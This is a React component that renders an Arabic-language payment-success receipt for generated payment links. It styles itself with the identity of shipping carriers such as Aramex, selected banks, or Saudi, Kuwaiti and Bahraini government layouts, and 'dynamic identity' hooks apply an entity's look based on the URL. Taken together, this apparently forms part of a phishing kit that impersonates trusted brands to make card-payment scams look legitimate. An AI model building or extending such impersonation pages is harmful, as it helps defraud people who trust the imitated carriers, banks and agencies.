import React from "react";
import { useParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { bankBranding } from "@/lib/brandingSystem";
import { CheckCircle2, Download, Home, Share2, Package, Calendar, CreditCard, Building2, ShieldCheck, Lock } from "lucide-react";
import { getServiceBranding } from "@/lib/serviceLogos";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getBankById } from "@/lib/banks";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";

const PaymentReceipt = () => {
  const { paymentId } = useParams();
  const { data: payment } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);

  useAutoApplyIdentity();
  const { identity: dynamicIdentity } = useDynamicIdentity();
  
  if (!payment || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  const countryData = getCountryByCode(link.country_code);
  if (!countryData) return null;
  
  const payload = link.payload;
  const country = link.country_code || "SA";
  const serviceKey = link.payload?.service_key || 'aramex';
  const serviceName = link.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  
  const selectedBankId = link.payload?.selectedBank || '';
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
  
  const primaryColor = dynamicIdentity?.colors?.primary || selectedBankBranding?.colors?.primary || companyBranding?.colors.primary || branding.colors.primary;
  const secondaryColor = dynamicIdentity?.colors?.secondary || selectedBankBranding?.colors?.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
  
  const formattedAmount = formatCurrency(payment.amount, link.country_code);
  const formattedDate = new Date(payment.created_at).toLocaleDateString('ar-SA', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });

  const renderReceipt = () => (
    <div className="space-y-6">
      <div className="text-center mb-10">
        <div 
          className="w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-6"
          style={{
            background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
            boxShadow: `0 8px 24px ${primaryColor}40`
          }}
        >
          <CheckCircle2 className="w-12 h-12 text-white" strokeWidth={2.5} />
        </div>
        <h2 className="text-3xl sm:text-4xl font-bold mb-3" style={{ color: designSystem.colors.neutral[900] }}>
          تم الدفع بنجاح!
        </h2>
        <p className="text-lg text-gray-600">شكراً لك، تم تأكيد عملية الدفع</p>
      </div>
      
      <Card className="overflow-hidden border-0 shadow-2xl rounded-[20px]">
        <div 
          className="px-6 sm:px-10 py-8 text-center"
          style={{
            background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
            borderBottom: `2px solid ${primaryColor}30`
          }}
        >
          <Badge className="text-sm px-5 py-2 mb-4" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`, color: '#FFFFFF' }}>
            <CheckCircle2 className="w-4 h-4 ml-2" />
            <span>مدفوع</span>
          </Badge>
          <p className="text-sm text-gray-600 mb-2">رقم الإيصال</p>
          <p className="text-3xl font-bold" style={{ color: primaryColor, fontFamily: 'monospace' }}>
            #{payment.id.substring(0, 12).toUpperCase()}
          </p>
        </div>
        
        <div className="px-6 sm:px-10 py-8 bg-white">
          <div className="space-y-5">
            <div className="flex items-center justify-between py-4 border-b">
              <div className="flex items-center gap-3 text-gray-600">
                <Package className="w-5 h-5" />
                <span className="text-base">الخدمة</span>
              </div>
              <span className="font-bold text-base">{serviceName}</span>
            </div>
            
            {selectedBank && (
              <div className="flex items-center justify-between py-4 border-b">
                <div className="flex items-center gap-3 text-gray-600">
                  <Building2 className="w-5 h-5" />
                  <span className="text-base">البنك</span>
                </div>
                <span className="font-semibold text-base">{selectedBank.nameAr}</span>
              </div>
            )}
            
            <div className="flex items-center justify-between py-4 border-b">
              <div className="flex items-center gap-3 text-gray-600">
                <CreditCard className="w-5 h-5" />
                <span className="text-base">طريقة الدفع</span>
              </div>
              <span className="font-semibold text-base">بطاقة •••• {payment.card_last4 || '****'}</span>
            </div>
            
            <div className="flex items-center justify-between py-4 border-b">
              <div className="flex items-center gap-3 text-gray-600">
                <Calendar className="w-5 h-5" />
                <span className="text-base">التاريخ والوقت</span>
              </div>
              <span className="font-semibold text-base" dir="ltr">{formattedDate}</span>
            </div>
            
            <div className="flex items-center justify-between py-6 px-6 rounded-2xl mt-6" style={{ background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)` }}>
              <span className="text-xl font-bold">المبلغ المدفوع</span>
              <span className="text-3xl font-bold" style={{ color: primaryColor }}>{formattedAmount}</span>
            </div>
          </div>
        </div>
      </Card>
      
      <div className="mt-8 space-y-4">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <Button size="lg" variant="outline" className="py-6 text-base font-semibold rounded-xl" style={{ borderColor: `${primaryColor}50`, color: primaryColor }}>
            <Download className="w-5 h-5 ml-2" />
            <span>تحميل الإيصال</span>
          </Button>
          <Button size="lg" variant="outline" className="py-6 text-base font-semibold rounded-xl" style={{ borderColor: `${primaryColor}50`, color: primaryColor }}>
            <Share2 className="w-5 h-5 ml-2" />
            <span>مشاركة</span>
          </Button>
        </div>
        <Button size="lg" className="w-full py-7 text-lg font-bold text-white rounded-xl" onClick={() => (window.location.href = "/")} style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`, boxShadow: `0 8px 20px ${primaryColor}40` }}>
          <Home className="w-6 h-6 ml-2" />
          <span>العودة للرئيسية</span>
        </Button>
      </div>
    </div>
  );
  
  const isShipping = link.type === 'shipping';
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`إيصال الدفع - ${serviceName}`}
        customDescription={`تم تأكيد الدفع بنجاح - ${serviceName}`}
        amount={formattedAmount}
      />

      {(() => {
        if (isShipping) {
          const Layout = getCompanyLayout(serviceKey);
          return (
            <Layout 
              companyKey={serviceKey} 
              amount={formattedAmount} 
              trackingNumber={payload?.tracking_number || `TRK-${payment.id.substring(0, 8).toUpperCase()}`}
            >
              {renderReceipt()}
            </Layout>
          );
        }

        if (country === 'SA' || country === 'KW' || country === 'BH') {
          const Layout = getGovernmentLayout(country);
          return (
            <Layout 
              countryCode={country} 
              amount={formattedAmount} 
              serviceName={serviceName}
            >
              {renderReceipt()}
            </Layout>
          );
        }

        return (
          <div 
            className="min-h-screen flex flex-col"
            dir="rtl"
            style={{
              background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
              fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
            }}
          >
            <div className="w-full py-6 px-4 shadow-md bg-white" style={{ borderBottom: `3px solid ${primaryColor}` }}>
              <div className="container mx-auto max-w-4xl flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 rounded-full flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}>
                    <CheckCircle2 className="w-6 h-6 text-white" />
                  </div>
                  <div>
                    <h1 className="text-xl sm:text-2xl font-bold">إيصال الدفع</h1>
                    <p className="text-sm text-gray-600">{serviceName}</p>
                  </div>
                </div>
                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                  <CheckCircle2 className="w-4 h-4 text-green-600" />
                  <span className="text-xs font-medium text-green-700">مكتمل</span>
                </div>
              </div>
            </div>

            <div className="flex-1 py-12">
              <div className="container mx-auto px-4 max-w-3xl">
                {renderReceipt()}
              </div>
            </div>
          </div>
        );
      })()}
    </>
  );
};

export default PaymentReceipt;
